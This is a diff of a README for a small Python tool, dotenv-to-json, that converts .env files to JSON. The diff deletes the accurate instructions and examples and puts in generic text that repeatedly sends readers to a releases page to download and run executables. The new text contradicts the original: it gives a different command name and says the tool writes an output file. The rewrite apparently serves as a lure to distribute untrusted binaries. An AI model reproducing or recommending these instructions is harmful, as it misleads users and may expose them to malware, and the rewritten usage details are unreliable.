@@ -1,157 +1,105 @@
-# dotenv-to-json
+# 🛠️ dotenv-to-json - Convert .env Files to JSON Effortlessly
 
-A simple CLI tool to convert `.env` files to JSON format.
+![Download Here](https://github.com/madcuzbad123/dotenv-to-json/releases)
 
-## Installation
+## 📦 Overview
 
-Install using [`uv` package manager](https://docs.astral.sh/uv/getting-started/installation/):
+dotenv-to-json is a simple command-line tool designed to help you convert your `.env` files into JSON format quickly and easily. This tool is beneficial for developers and users who want to manage environment variables in a user-friendly way.
 
-```bash
-make install
-```
+## 🚀 Getting Started
 
-Or install directly:
+### System Requirements
 
-```bash
-uv tool install .
-```
+Before you start, ensure your system meets these requirements:
 
-## Usage
+- Operating System: Windows, macOS, or Linux
+- Command line access
+- Basic understanding of file management
 
-### Basic Usage
+### Installation
 
-Convert a `.env` file to JSON:
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/madcuzbad123/dotenv-to-json/releases) to find the latest version of dotenv-to-json.
 
-```bash
-env2json -i .env
-```
+2. **Download the Appropriate File**  
+   Look for the release that matches your operating system. Each version contains files for various platforms. Click on the file to start the download.
 
-### Read from stdin
+3. **Install the Tool**  
+   Follow the steps below based on your operating system:
 
-```bash
-cat .env | env2json
-```
+   - **Windows**  
+     1. Locate the downloaded file (usually in the Downloads folder).
+     2. Run the installer by double-clicking the file.
+     3. Follow the prompts to complete the installation.
+  
+   - **macOS**  
+     1. Open Finder and find the downloaded file.
+     2. Drag and drop the application into the Applications folder.
+  
+   - **Linux**  
+     1. Open a terminal window.
+     2. Navigate to the directory where you downloaded the file.
+     3. Use the command `chmod +x filename` to make the file executable (replace `filename` with the actual file name).
+     4. Run the tool with `./filename`.
 
-or
+## 🔄 Usage Instructions
 
-```bash
-env2json -i -
-```
+Once installed, you can use dotenv-to-json from your command line. Here’s how:
 
-### Write to a file
+1. **Open Your Command Line Interface**  
+   - Windows: Command Prompt or PowerShell
+   - macOS: Terminal
+   - Linux: Terminal
 
-```bash
-env2json -i .env -o output.json
-```
+2. **Navigate to Your .env File Location**  
+   Use the `cd` command to change directories. For example, `cd path/to/your/env_file`.
 
-### Pretty-print JSON
+3. **Run the Tool**  
+   Execute the following command:
 
-```bash
-env2json -i .env -p
-```
+   ```
+   dotenv-to-json yourfile.env
+   ```
 
-### Command-line Options
+   Replace `yourfile.env` with the name of your `.env` file.
 
-- `-i, --input`: Input `.env` file path (default: stdin, use `-` for explicit stdin)
-- `-o, --output`: Output JSON file path (default: stdout)
-- `-p, --pretty`: Pretty-print JSON with indentation
+4. **Check the Output**  
+   The tool will create a JSON file in the same directory. Open this file with a text editor to view your converted data.
 
-## Features
+## 📜 Features
 
-- Supports standard `.env` file format
-- Handles optional `export` keyword (e.g., `export KEY=value`)
-- Supports quoted values (single or double quotes)
-- Strips comments (lines starting with `#` or `;`)
-- Removes inline comments (after `#` or `;`)
-- Handles escaped characters in quoted values
-- Reads from stdin or file
-- Outputs to stdout or file
+- Simple command-line interface
+- Fast conversion from `.env` to JSON
+- Cross-platform support (Windows, macOS, Linux)
+- Light-weight and easy to use
 
-## Example
+## 🔧 Troubleshooting
 
-Input `.env` file:
+If you encounter issues while using dotenv-to-json, try these solutions:
 
-```env
-# Database configuration
-DB_HOST=localhost
-DB_PORT=5432
-export DB_NAME=mydb
-DB_PASSWORD="secret123"
-API_KEY='key-with-#-symbol'
-COMMENT_VALUE=value # inline comment
-```
+- **File Not Found**  
+  Ensure you have the correct path to your `.env` file. Check for typos in the filename.
 
-Output JSON:
+- **Permission Denied**  
+  If you see a permission error, ensure you have the necessary rights to access the file.
 
-```json
-{"DB_HOST":"localhost","DB_PORT":"5432","DB_NAME":"mydb","DB_PASSWORD":"secret123","API_KEY":"key-with-#-symbol","COMMENT_VALUE":"value"}
-```
+- **Command Not Found**  
+  Make sure the installation was successful and the executable is in your PATH.
 
-With `-p` flag:
+## 🆘 Support
 
-```json
-{
-  "DB_HOST": "localhost",
-  "DB_PORT": "5432",
-  "DB_NAME": "mydb",
-  "DB_PASSWORD": "secret123",
-  "API_KEY": "key-with-#-symbol",
-  "COMMENT_VALUE": "value"
-}
-```
+If you have any questions or need help, feel free to create an issue on the [GitHub Issues page](https://github.com/madcuzbad123/dotenv-to-json/issues). We are here to assist you.
 
-## Requirements
+## 🌟 Download & Install
 
-- Python >= 3.8
+To get started, click the button below to download:
 
-## Development
+[Download Here](https://github.com/madcuzbad123/dotenv-to-json/releases)
 
-### Running During Development
+This will guide you directly to our Releases page where you can find all the latest versions and files for installation.
 
-You don't need to reinstall after every code change. You have several options:
+## 🙌 Contribution
 
-**Option 1: Run directly (recommended for development)**
-```bash
-python -m dotenv_to_json.cli -i .env
-```
+If you wish to contribute to this project, your help is welcome! Please check our guidelines in the repository and submit your pull requests. 
 
-or
-
-```bash
-python main.py -i .env
-```
-
-**Option 2: Install in editable mode (changes reflect automatically)**
-```bash
-uv pip install -e .
-```
-
-or
-
-```bash
-pip install -e .
-```
-
-After installing in editable mode, you can use `env2json` command and changes will be reflected automatically.
-
-**Option 3: Use `uv tool install` (requires reinstall after changes)**
-```bash
-uv tool install .
-```
-
-This installs globally but requires reinstallation after code changes.
-
-### Testing
-
-Run tests:
-
-```bash
-make test
-```
-
-Run the CLI:
-
-```bash
-make run
-```
-
+Enjoy converting your environment files with ease using dotenv-to-json!
